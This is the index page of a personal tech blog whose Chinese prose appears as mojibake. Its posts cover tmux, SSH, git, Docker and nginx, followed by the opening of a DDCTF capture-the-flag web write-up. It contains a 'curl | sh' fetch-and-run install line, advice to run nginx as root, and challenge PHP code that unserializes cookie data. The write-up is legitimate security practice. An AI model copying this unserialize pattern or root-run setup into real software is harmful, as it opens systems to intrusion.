<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content><meta name="keywords" content><meta name="author" content="Arnoux"><meta name="copyright" content="Arnoux"><title>æ¨±èŠ±è¾¹ç¼˜</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Arnoux</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">æ–‡ç« </span><span class="pull-right">7</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">æ ‡ç­¾</span><span class="pull-right">2</span></a></div></div></div><nav id="nav" style="background-image: url(https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/background.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">æ¨±èŠ±è¾¹ç¼˜</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="https://github.com/gwjczwy">Github</a></span></div><div id="site-info"><div id="site-title">æ¨±èŠ±è¾¹ç¼˜</div><div id="site-sub-title"></div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2019/05/21/å¼€ç®±ä¸€ä¸ªæ— æŸå‹ç¼©å›¾ç‰‡ç¨‹åº/">å¼€ç®±ä¸€ä¸ªæ— æŸå‹ç¼©å›¾ç‰‡ç¨‹åº</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-05-21</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/é—²èŠ/">é—²èŠ</a></span><div class="content"><p>è¿™ä¸¤å¤©å†™ç®€å†æ‰å‘ç°ç®€å†ä¸Šä¸œè¥¿å°‘,äºæ˜¯å°±æŠŠå¾ˆä¹…ä¹‹å‰å†™çš„è¿™ä¹ˆä¸ªå°ç©æ„æ‹¿å‡ºæ¥æ°´ä¸€ç¯‡é¡¹ç›®.é¡ºä¾¿æ°´ä¸€ç¯‡åšå®¢,æˆ‘çœŸæ˜¯ä¸ªå¤©æ‰.å“ˆå“ˆ</p>
<p>å…¶å®å¾ˆæ—©ä¹‹å‰å°±æœ‰äº†ä¸ªè¿™ä¹ˆä¸ªä¸œè¥¿,åªæ˜¯ä¸€ç›´æ²¡æƒ³èµ·æ¥æ”¾åˆ°GitHubä¸Šæ¥.ä¸€æ–¹é¢æ˜¯å› ä¸ºæ‡’,ä¸€æ–¹é¢æ˜¯å› ä¸ºæ²¡è¿™ä¸ªæ„è¯†.</p>
<p>æœ€è¿‘åœ¨ç¿»ä»¥å‰å†™çš„ä»£ç çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆèƒ½æ‹¿å¾—å‡ºæ‰‹çš„.</p>
<p>è¿™ä¸ªå°ç©æ„çš„ç¡®æ²¡å¤ªæœ‰ä»€ä¹ˆæŠ€æœ¯å«é‡,éƒ½æ˜¯ç›´æ¥è°ƒç”¨çš„Pythonåº“.</p>
<p>ä¸è¿‡ä»–å°å·§æ˜“ç”¨.ä¸€ä¸ªå•æ–‡ä»¶,æ”¾åˆ°å“ªå°±èƒ½ç›´æ¥å‹ç¼©å½“å‰æ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰å›¾ç‰‡.æœ€é‡è¦çš„æ˜¯æ€§èƒ½å¾ˆé«˜,å¹³å‡å¤§æ¦‚èƒ½å‹ç¼©æ‰40%çš„åŸå ç©ºé—´.å¯¹äºå‘æˆ‘è¿™æ ·çš„ç”µè„‘é‡Œå­˜äº†å‡ åä¸ªGçš„å°å§å§çš„äººæ¥è¯´èŠ‚çœä¸‹æ¥çš„ç©ºé—´è¿˜æ˜¯å¾ˆå®¢è§‚çš„ğŸ˜†</p>
<p>è¿™ä¸ªé¡¹ç›®ä¹Ÿå°±ç›¸å½“äºæŠŠPythonçš„ä¸€ä¸ªåº“ç»™exeåŒ–äº†è€Œå·².ğŸ˜‚</p>
<p><a href="https://github.com/gwjczwy/Lossless-image-compression" target="_blank" rel="noopener">é¡¹ç›®åœ°å€</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/05/18/linux tmux è¯­æ³•/">linux tmux è¯­æ³•</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-05-18</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/æŠ€æœ¯/">æŠ€æœ¯</a></span><div class="content"><h1 id="linux-tmux-è¯­æ³•"><a href="#linux-tmux-è¯­æ³•" class="headerlink" title="linux tmux è¯­æ³•"></a>linux tmux è¯­æ³•</h1><h2 id="tmux-å‚æ•°"><a href="#tmux-å‚æ•°" class="headerlink" title="tmux å‚æ•°"></a>tmux å‚æ•°</h2><ul>
<li><code>new -s djangoBlog</code> åˆ›å»ºä¼šè¯</li>
<li><code>a -t djangoBlog</code>è¿›å…¥ä¼šè¯</li>
<li><code>ls</code>ä¼šè¯åˆ—è¡¨</li>
</ul>
<h2 id="æŒ‰ä¸‹Ctrl-Bå"><a href="#æŒ‰ä¸‹Ctrl-Bå" class="headerlink" title="æŒ‰ä¸‹Ctrl+Bå"></a>æŒ‰ä¸‹Ctrl+Bå</h2><h4 id="ä¿®æ”¹çª—å£"><a href="#ä¿®æ”¹çª—å£" class="headerlink" title="ä¿®æ”¹çª—å£"></a>ä¿®æ”¹çª—å£</h4><ul>
<li><code>%</code> å·¦å³å¹³åˆ†å‡ºä¸¤ä¸ªçª—æ ¼</li>
<li><code>&quot;</code> ä¸Šä¸‹å¹³åˆ†å‡ºä¸¤ä¸ªçª—æ ¼</li>
<li><code>{</code> å½“å‰çª—æ ¼å‰ç§»</li>
<li><code>}</code> å½“å‰çª—æ ¼åç§»</li>
<li>åŒæ—¶æŒ‰æ–¹å‘é”®è°ƒæ•´çª—å£å¤§å°</li>
</ul>
<h4 id="æ“ä½œçª—å£"><a href="#æ“ä½œçª—å£" class="headerlink" title="æ“ä½œçª—å£"></a>æ“ä½œçª—å£</h4><ul>
<li>æ–¹å‘é”®åˆ‡æ¢çª—å£</li>
<li><code>t</code> çª—å£æ˜¾ç¤ºæ—¶é—´</li>
<li><code>$</code> é‡å‘½å</li>
<li><code>b</code>å›åˆ°<code>bash</code></li>
<li><code>k</code>ç»“æŸä¼šè¯</li>
<li><code>x</code> å…³é—­å½“å‰çª—æ ¼</li>
</ul>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/05/10/opensshé…ç½®å…å¯†ç™»å½•/">opensshé…ç½®ä¸ä½¿ç”¨</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-05-10</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/æŠ€æœ¯/">æŠ€æœ¯</a></span><div class="content"><p>é¦–å…ˆä¸‹è½½<code>openssh</code>å¹¶é…ç½®ç¯å¢ƒå˜é‡</p>
<p>å‘½ä»¤è¡Œæ‰§è¡Œ<code>ssh-keygen</code>ç„¶åä¸€è·¯å›è½¦,è¿™æ—¶å¯†åŒ™å°±ç”Ÿæˆäº†</p>
<p>å°†<code>Windows</code>ä¸Šçš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:/Users/wish/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>
<p>è¿½åŠ åˆ°<code>Linux</code>ä¸Šçš„</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>ä¹‹å<code>Windows</code>ä¸Šç›´æ¥ç”¨<code>ssh root@127.0.0.1</code>å¯å…å¯†ç™»å½•</p>
<p>æ–‡ä»¶ä¼ è¾“å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scp c:\data.json root@127.0.0.1:/home/data</span><br></pre></td></tr></table></figure>
<p><code>ssh</code>é…ç½®æ–‡ä»¶ä½ç½®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/05/10/gitå¸¸ç”¨å‘½ä»¤/">gitåŸºç¡€å‘½ä»¤</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-05-10</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/æŠ€æœ¯/">æŠ€æœ¯</a></span><div class="content"><h2 id="æ›´æ–°å½“å‰ç›®å½•å†…å®¹"><a href="#æ›´æ–°å½“å‰ç›®å½•å†…å®¹" class="headerlink" title="æ›´æ–°å½“å‰ç›®å½•å†…å®¹"></a>æ›´æ–°å½“å‰ç›®å½•å†…å®¹</h2><p>å…ˆè¿›å…¥åˆ°é¡¹ç›®ç›®å½•,ç„¶åå¼€ä»¥ä¸‹è¿æ‹›</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;æœ¬æ¬¡æ›´æ–°äº†è›¤&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>
<p>æ­¤æ—¶å¦‚æœæŠ¥äº†å¦‚ä¸‹é”™è¯¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Integrate the remote changes (e.g.hint: &apos;git pull ...&apos;) before pushing again</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆå¾ˆæ˜æ˜¾æœ‰äººåœ¨ä½ ä¸Šæ¬¡åŒæ­¥ä»£ç åæäº¤äº†ä»£ç .æ‰€ä»¥æˆ‘ä»¬éœ€è¦å…ˆåŒæ­¥ä»£ç åˆ°æœ€æ–°çš„ç‰ˆæœ¬,ç„¶åå†æ¨é€è‡ªå·±çš„ä»£ç .</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pull --rebase origin master</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œäº†è¿™ä¸€å¥ä¹‹åå†è¿›è¡Œæ¨é€<code>git push</code></p>
<p>é‚£ä¹ˆå¦‚ä½•å°†æœ¬åœ°é¡¹ç›®å…³è”åˆ°<code>GitHub</code>çš„å·²æœ‰é¡¹ç›®ä¸Šå‘¢</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git remote add origin ä½ çš„è¿œç¨‹ä»“åº“åœ°å€</span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/05/06/Dockerå¸¸ç”¨å‘½ä»¤/">Dockerå¸¸ç”¨å‘½ä»¤</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-05-06</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/æŠ€æœ¯/">æŠ€æœ¯</a></span><div class="content"><h1 id="Ubuntuå®‰è£…docker"><a href="#Ubuntuå®‰è£…docker" class="headerlink" title="Ubuntuå®‰è£…docker"></a>Ubuntuå®‰è£…docker</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>
<h1 id="åŒæ­¥dockeré•œåƒåˆ°dockerhubä¸Š"><a href="#åŒæ­¥dockeré•œåƒåˆ°dockerhubä¸Š" class="headerlink" title="åŒæ­¥dockeré•œåƒåˆ°dockerhubä¸Š"></a>åŒæ­¥dockeré•œåƒåˆ°dockerhubä¸Š</h1><h2 id="å°†å®¹å™¨å˜ä¸ºé•œåƒå¹¶ä¸Šä¼ åˆ°dockerhubä»“åº“"><a href="#å°†å®¹å™¨å˜ä¸ºé•œåƒå¹¶ä¸Šä¼ åˆ°dockerhubä»“åº“" class="headerlink" title="å°†å®¹å™¨å˜ä¸ºé•œåƒå¹¶ä¸Šä¼ åˆ°dockerhubä»“åº“"></a>å°†å®¹å™¨å˜ä¸ºé•œåƒå¹¶ä¸Šä¼ åˆ°dockerhubä»“åº“</h2><p>ç™»å½•</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker login</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹å®¹å™¨ID</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>
<h3 id="è½¬æ¢å®¹å™¨ä¸ºé•œåƒ"><a href="#è½¬æ¢å®¹å™¨ä¸ºé•œåƒ" class="headerlink" title="è½¬æ¢å®¹å™¨ä¸ºé•œåƒ"></a>è½¬æ¢å®¹å™¨ä¸ºé•œåƒ</h3><figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker commit a103d141fc98 arnoux/sql</span><br></pre></td></tr></table></figure>
<p>æ·»åŠ æ ‡ç­¾</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker tag imageName arnoux/mysql:u1</span><br></pre></td></tr></table></figure>
<p>ä¸Šä¼ é•œåƒ</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker push arnoux/mysql:u1</span><br></pre></td></tr></table></figure>
<h2 id="ç›´æ¥ä½¿ç”¨Dockerfileæ„å»º"><a href="#ç›´æ¥ä½¿ç”¨Dockerfileæ„å»º" class="headerlink" title="ç›´æ¥ä½¿ç”¨Dockerfileæ„å»º"></a>ç›´æ¥ä½¿ç”¨Dockerfileæ„å»º</h2><p>æ„å»º<code>Dockerfile</code>æ–‡ä»¶</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> nginx</span><br><span class="line"><span class="keyword">RUN</span> echo 'hello word(from docker nginx)' &gt; /usr/share/nginx /html/index.html</span><br></pre></td></tr></table></figure>
<p>ç”Ÿæˆé•œåƒ</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker build -t nginx:v1 .</span><br></pre></td></tr></table></figure>
<p>æŸ¥çœ‹é•œåƒçš„<code>REPOSITORY</code>å’Œ<code>TAG</code></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>
<p>æ¨é€åˆ¶ä½œçš„é•œåƒ</p>
<p>æ ‡è®°é•œåƒï¼Œå½’å…¥è‡ªå·±çš„ä»“åº“</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker tag nginx:v1 arnoux/nginx:v1</span><br></pre></td></tr></table></figure>
<p>æ¨é€é•œåƒ</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">docker push arnoux/nginx:v1</span><br></pre></td></tr></table></figure>
<h1 id="dockerå¸¸ç”¨å‘½ä»¤"><a href="#dockerå¸¸ç”¨å‘½ä»¤" class="headerlink" title="dockerå¸¸ç”¨å‘½ä»¤"></a>dockerå¸¸ç”¨å‘½ä»¤</h1><h2 id="è¿›å…¥ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨"><a href="#è¿›å…¥ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨" class="headerlink" title="è¿›å…¥ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨"></a>è¿›å…¥ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„å®¹å™¨</h2><p><code>docker exec -it msf /bin/bash</code></p>
<h2 id="æ ¹æ®-Dockerfile-æ„å»ºdockeré•œåƒ"><a href="#æ ¹æ®-Dockerfile-æ„å»ºdockeré•œåƒ" class="headerlink" title="æ ¹æ® Dockerfile æ„å»ºdockeré•œåƒ"></a>æ ¹æ® Dockerfile æ„å»ºdockeré•œåƒ</h2><p><code>docker image build -t koa-demo:0.0.1 .</code></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/04/26/ä½¿ç”¨nginxæ­å»ºæ–­ç‚¹ç»­ä¼ æ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨/">ä½¿ç”¨nginxæ­å»ºæ–­ç‚¹ç»­ä¼ æ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-26</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/æŠ€æœ¯/">æŠ€æœ¯</a></span><div class="content"><h1 id="ä½¿ç”¨nginxæ­å»ºæ–­ç‚¹ç»­ä¼ æ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨"><a href="#ä½¿ç”¨nginxæ­å»ºæ–­ç‚¹ç»­ä¼ æ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨" class="headerlink" title="ä½¿ç”¨nginxæ­å»ºæ–­ç‚¹ç»­ä¼ æ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨"></a>ä½¿ç”¨nginxæ­å»ºæ–­ç‚¹ç»­ä¼ æ–‡ä»¶ä¸‹è½½æœåŠ¡å™¨</h1><h2 id="dockerä¸€é”®éƒ¨ç½²"><a href="#dockerä¸€é”®éƒ¨ç½²" class="headerlink" title="dockerä¸€é”®éƒ¨ç½²"></a>dockerä¸€é”®éƒ¨ç½²</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker container run -d --rm --name nginx -p 0.0.0.0:80:80 -v $PWD:/usr/share/nginx/html nginx</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œé»˜è®¤å¼€æ”¾çš„æ˜¯80ç«¯å£,æ˜ å°„çš„æ˜¯å½“å‰ç›®å½•.å¦‚è¦ä¿®æ”¹è¯·ä¿®æ”¹-påçš„ç¬¬ä¸€ä¸ª80</p>
<p>ç„¶åå»è®¿é—®è‡ªå·±æœåŠ¡å™¨çš„80ç«¯å£å°±è¡Œäº†.è™½ç„¶çœ‹ä¸åˆ°ç›®å½•ä¸‹æ–‡ä»¶åˆ—è¡¨å´å¯ä»¥ç›´æ¥ä¸‹è½½</p>
<p>æ¯”å¦‚æˆ‘åœ¨æ‰§è¡Œdockerè¯­å¥æ—¶åœ¨Downloadç›®å½•ä¸‹,å…¶ç›®å½•ç»“æ„å¦‚ä¸‹:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">æ–‡ä»¶å¤¹ Download åˆ—è¡¨</span><br><span class="line">Download</span><br><span class="line">â”œâ”€root.zip</span><br><span class="line">â”œâ”€Linux</span><br><span class="line">â”‚  â””â”€shell.zip</span><br></pre></td></tr></table></figure>
<p>æ¯”å¦‚æˆ‘æƒ³ä¸‹è½½<code>root.zip</code>å°±å¯ä»¥è®¿é—®<code>ip/root.zip</code></p>
<p>æ­£å¸¸æ¥è¯´åˆ°è¿™é‡Œå°±å¯ä»¥äº†,å¦‚æœä¸‹è½½æ–‡ä»¶è¿˜æ˜¯403å°±éœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶é‡Œçš„ä¸€ä¸ªå‚æ•°å¹¶é‡å¯<code>nginx</code></p>
<h2 id="è¿›å…¥å®¹å™¨"><a href="#è¿›å…¥å®¹å™¨" class="headerlink" title="è¿›å…¥å®¹å™¨"></a>è¿›å…¥å®¹å™¨</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker exec -ti nginx /bin/bash</span><br></pre></td></tr></table></figure>
<h2 id="å®‰è£…vim"><a href="#å®‰è£…vim" class="headerlink" title="å®‰è£…vim"></a>å®‰è£…vim</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install vim -y</span><br></pre></td></tr></table></figure>
<h2 id="ä¿®æ”¹é…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹é…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹é…ç½®æ–‡ä»¶"></a>ä¿®æ”¹é…ç½®æ–‡ä»¶</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br><span class="line"><span class="meta">#</span>ä¿®æ”¹ç¬¬ä¸€è¡Œçš„user xxxx;ä¸ºuser root;</span><br></pre></td></tr></table></figure>
<h2 id="é‡å¯nginx"><a href="#é‡å¯nginx" class="headerlink" title="é‡å¯nginx"></a>é‡å¯nginx</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure>
<p>è™½è¯´è¿™æ ·èƒ½æ–­ç‚¹ç»­ä¼ ,ä½†ä¸‹è½½é€Ÿåº¦è¿˜æ˜¯ä¸ç†æƒ³.ä¸è¿‡è‡³å°‘è§£å†³äº†å¤§æ–‡ä»¶ä¸‹åˆ°ä¸€åŠç›´æ¥æ–­å¼€æ²¡æ³•ç»§ç»­ä¸‹è½½çš„çª˜å¢ƒ.å¦‚æœæ²¡æ³•æ–­ç‚¹ç»­ä¼ çš„è¯500mä»¥ä¸Šçš„æ–‡ä»¶å‹æ ¹å°±ä¸èƒ½ä¸‹è½½.å‡ ä¹è‚¯å®šä¼šæ–­</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/003x01.png" alt="10çº¿ç¨‹æ‰ä¸åˆ°2m"></p>
<p>ç½‘ä¸Šå¾ˆå¤šå…³äºå¦‚ä½•æ­å»ºnginxæ–­ç‚¹ç»­ä¼ æœåŠ¡å™¨çš„æ•™ç¨‹,å…¨éƒ½éå¸¸ç¹çä¹±ä¸ƒå…«ç³Ÿ.æ˜æ˜ä¸‰ä¸¤å¥è¯å°±èƒ½è¯´æ¸…æ¥šçš„éå¾—å†™ä¸€å¤§ç¯‡.æœ€åè¿˜æ— æ³•å¤ç°,æµªè´¹æ—¶é—´.æ˜æ˜ä¸æƒ³è¯¦ç»†äº†è§£nginxé…ç½®æ–‡ä»¶çš„é—®é¢˜çš„éå¾—æ‰¯ä¸€å¤§å †.è¯•äº†å¥½å¤šæ•™ç¨‹æ²¡æœ‰ä¸€ä¸ªèƒ½æˆåŠŸçš„.å¹²è„†è‡ªå·±å†™ä¸€ç¯‡æ€»ç»“.</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/04/22/æœ€è¿‘æ‰“çš„ä¸€äº›ctfçš„writeup/">æœ€è¿‘æ‰“çš„ä¸€äº›ctfçš„writeup</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-22</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/æŠ€æœ¯/">æŠ€æœ¯</a></span><div class="content"><h1 id="2019DDCTF-writeUP"><a href="#2019DDCTF-writeUP" class="headerlink" title="2019DDCTF writeUP"></a>2019DDCTF writeUP</h1><h2 id="WEBç­¾åˆ°é¢˜"><a href="#WEBç­¾åˆ°é¢˜" class="headerlink" title="WEBç­¾åˆ°é¢˜"></a>WEBç­¾åˆ°é¢˜</h2><p>å„ä½å¤§ä½¬æ˜¯ä¸æ˜¯å¯¹ç­¾åˆ°é¢˜æœ‰ä»€ä¹ˆè¯¯è§£â€¦.</p>
<p>é¢˜ç›®é“¾æ¥</p>
<p><a href="http://117.51.158.44/index.php" target="_blank" rel="noopener">http://117.51.158.44/index.php</a></p>
<p>æ‰“å¼€é“¾æ¥å‘ç°æç¤ºæ²¡æœ‰ç™»é™†æƒé™,æŸ¥çœ‹jsæºä»£ç å‘ç°è¯·æ±‚äº†ä¸€æ¬¡</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/002x01.png" alt="img"></p>
<p>ä½¿ç”¨postmané‡æ–°å‘é€è¯·æ±‚å¹¶å°†didictf_usernameçš„å€¼æ·»åŠ ä¸ºadmin</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/002x02.png" alt="img"></p>
<p>æç¤ºè®¿é—®app/fL2XID2i0Cdh.php</p>
<p>æŸ¥çœ‹åå‘ç°ä¸ºç½‘é¡µçš„phpæºä»£ç </p>
<h3 id="Session-php"><a href="#Session-php" class="headerlink" title="Session.php"></a>Session.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//keyå»ºè®®ä¸º8ä½å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration          = <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path                = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain              = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure              = <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span 